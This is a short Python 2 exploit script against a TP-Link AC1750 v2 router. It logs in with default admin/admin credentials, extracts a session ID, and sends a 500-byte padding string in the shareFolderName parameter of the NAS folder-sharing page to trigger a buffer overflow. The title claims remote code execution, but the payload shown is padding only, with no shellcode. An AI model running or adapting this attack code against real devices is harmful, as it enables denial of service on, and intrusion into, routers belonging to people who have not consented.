# Title: TP-Link AC1750 v2 - Authenticated Remote Code Execution
# Author: Gilson Camelo

import re
import os
import md5
import sys
import time
import struct
import base64
import urllib
import requests


print "[#] Trying to obtein a valid Session!"
base_url = "http://192.168.0.1"
login_url = base_url+"/userRpm/LoginRpm.htm?Save=Save"
router_user = "admin"
router_passwd = "admin"
basic_string = base64.b64encode(router_user + ":" + router_passwd)
cookie_auth_string = urllib.quote("Basic "+base64.b64encode(router_user + ":" + md5.new(router_passwd).hexdigest()))

headers = { 
			"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0", 
			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
			"Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", 
			"Referer": "http://192.168.0.1/", 
			"Cookie": "Authorization="+cookie_auth_string, 
			"Authorization": "Basic "+basic_string, 
			"Connection": "close", 
			"Upgrade-Insecure-Requests": "1"
		  }

session_id = ""  
for tries in range(0,5):
	try:
		r = requests.get(login_url, headers=headers)
		session_id = re.findall('[A-Z]{16}', r.text)[0]
	except:
		pass
	if session_id != "":
		print "[#] A session was obteined!"
		break
	if tries == 4:
		print "[-] Exploit Failed :("
		sys.exit()

print "[#] Crafting Payload"
# Padding for the Overflow
padding = "A"* 500

payload = padding

print "[#] Triggering the Bug"
bof_url = base_url+"/"+session_id+"/userRpm/NasFolderSharingRpm.htm?displayName=bof&mediaShare=on&shareFolderName="+payload+"&no_use_para_just_fix_ie_sub_bug=&Save=Save&selPage=0&Page=1&subpage=2"
requests.get(bof_url, headers=headers)
